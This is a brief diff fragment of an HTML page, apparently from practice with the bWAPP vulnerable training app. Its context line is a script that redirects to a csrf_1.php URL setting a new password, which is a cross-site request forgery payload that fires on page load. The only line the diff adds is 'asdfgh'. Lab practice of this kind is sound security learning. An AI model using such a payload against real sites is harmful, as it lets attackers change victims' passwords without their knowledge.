@@ -5,3 +5,4 @@ document.location="https://bwapp.hakhub.net/csrf_1.php?password_new=password&pas
 </script>
 </body>
 </html>
+asdfgh
